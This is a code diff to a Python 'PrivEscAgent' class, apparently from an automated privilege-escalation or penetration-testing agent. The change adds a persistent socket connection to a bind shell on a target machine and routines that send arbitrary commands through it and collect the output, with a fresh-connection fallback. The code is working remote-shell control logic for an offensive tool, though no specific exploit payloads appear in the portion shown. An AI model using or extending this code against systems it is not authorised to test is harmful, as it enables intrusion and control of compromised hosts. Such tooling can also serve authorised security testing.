@@ -151,6 +151,42 @@ class PrivEscAgent(BaseAgent):
         self.techniques_tried: list[dict] = []
         self.root_achieved = False
         self.successful_technique: Optional[dict] = None
+        
+        # Persistent shell state
+        import threading
+        self._shell_socket = None
+        self._socket_lock = threading.Lock()
+        
+    def _connect_shell(self, target: str, shell_port: int) -> bool:
+        """Establish a persistent socket connection to the bind shell."""
+        if not shell_port:
+            return False
+            
+        import socket
+        try:
+            with self._socket_lock:
+                if self._shell_socket:
+                    return True  # Already connected
+                    
+                self._shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self._shell_socket.settimeout(15)
+                self._shell_socket.connect((target, shell_port))
+                self.log_info(f"Established persistent shell connection to {target}:{shell_port}")
+                return True
+        except Exception as e:
+            self.log_warning(f"Failed to connect persistent shell: {e}")
+            self._shell_socket = None
+            return False
+            
+    def _disconnect_shell(self):
+        """Close the persistent shell connection."""
+        if self._shell_socket:
+            try:
+                self._shell_socket.close()
+            except:
+                pass
+            with self._socket_lock:
+                self._shell_socket = None
 
     def run(self, target: str, briefing: dict = {}) -> dict:
         """
@@ -163,7 +199,8 @@ class PrivEscAgent(BaseAgent):
         self.target = target
         self.shell_info = briefing.get("shell_info", {})
         initial_user = briefing.get("initial_user", "unknown")
-        shell_port = self.shell_info.get("port", briefing.get("shell_port", 0))
+        shell_port_raw = self.shell_info.get("port") or briefing.get("shell_port") or 0
+        shell_port = int(shell_port_raw)
         
         self.console.print(Panel(
             f"[bold magenta]🔓 PrivEscAgent — Intelligent Privilege Escalation[/]\n"
@@ -802,30 +839,96 @@ class PrivEscAgent(BaseAgent):
     def _exec_shell_cmd(
         self, target: str, shell_port: int, command: str, timeout: int = 15
     ) -> str:
-        """Execute a command through the active shell connection using socket."""
+        """Execute a command through the active shell connection using a persistent socket."""
         if not shell_port:
             self.log_warning("No shell port specified — cannot execute commands")
             return ""
 
         import socket
+        import select
         import time
         
         # VERBOSE: Log tool call
         self._verbose_tool_call("shell_cmd", [f"nc {target}:{shell_port}", f"input: {command}"])
         
+        # Ensure connected
+        sock = self._shell_socket
+        if not sock:
+            if not self._connect_shell(target, shell_port):
+                return self._exec_shell_cmd_fallback(target, shell_port, command, timeout)
+            sock = self._shell_socket
+            if not sock:
+                return self._exec_shell_cmd_fallback(target, shell_port, command, timeout)
+            
         try:
-            # Use socket for better bindshell compatibility
+            with self._socket_lock:
+                # Add unique marker for output parsing
+                marker = f"__END_CMD_{id(command)}__"
+                full_cmd = f"{command}; echo '{marker}'\n"
+                
+                sock.send(full_cmd.encode())
+                
+                # Read until we get the marker or timeout
+                chunks = []
+                start_time = time.time()
+                
+                while time.time() - start_time < timeout:
+                    # Use select for non-blocking read with timeout
+                    ready = select.select([sock], [], [], 0.5)
+                    if ready[0]:
+                        try:
+                            chunk = sock.recv(4096)
+                            if not chunk:
+                                break
+                            chunks.append(chunk.decode(errors="ignore"))
+                            
+                            # Check if we got our marker
+                            combined = "".join(chunks)
+                            if marker in combined:
+                                break
+                        except socket.error:
+                            break
+                    else:
+                        # No data ready, check if we have enough
+                        if chunks:
+                            break
+                            
+                output = "".join(chunks)
+                
+                # Remove marker and command echo
+                if marker in output:
+                    output = output.split(marker)[0]
+                
+                lines = output.split("\n")
+                if lines and command[:20] in lines[0]:
+                    output = "\n".join(lines[1:])
+                
+                # VERBOSE: Log shell output
+                self._verbose_shell_output(output.strip())
+                
+                return output.strip()
+                
+        except socket.timeout:
+            self.log_warning(f"Command timed out: {command[:50]}")
+            return ""
+        except Exception as e:
+            self.log_warning(f"Persistent shell command failed: {e}")
+            self._disconnect_shell()
+            return self._exec_shell_cmd_fallback(target, shell_port, command, timeout)
+            
+    def _exec_shell_cmd_fallback(self, target: str, shell_port: int, command: str, timeout: int = 15) -> str:
+        """Fallback for executing a command via a new socket connection."""
+        import socket
+        import time
+        
+        try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(timeout)
             sock.connect((target, shell_port))
             
-            # Send command
             sock.send(f"{command}\n".encode())
-            
-            # Read response with short delay
             time.sleep(0.5)
             
-            # Receive all available data
             chunks = []
             sock.setblocking(False)
             try:
@@ -835,26 +938,19 @@ class PrivEscAgent(BaseAgent):
                         break
                     chunks.append(chunk)
             except (socket.error, BlockingIOError):
-                pass  # No more data
+                pass
             
             sock.close()
             output = b"".join(chunks).decode(errors="ignore")
             
-            # Remove command echo if present
             lines = output.split("\n")
             if lines and command[:20] in lines[0]:
                 output = "\n".join(lines[1:])
             
-            # VERBOSE: Log shell output
-            self._verbose_shell_output(output.strip())
-            
             return output.strip()
-
         except socket.timeout:
-            self.log_warning(f"Command timed out: {command[:50]}")
             return ""
-        except Exception as e:
-            self.log_warning(f"Shell command failed: {e}")
+        except Exception:
             return ""
 
     # ══════════════════════════════════════════════════════════════════════════
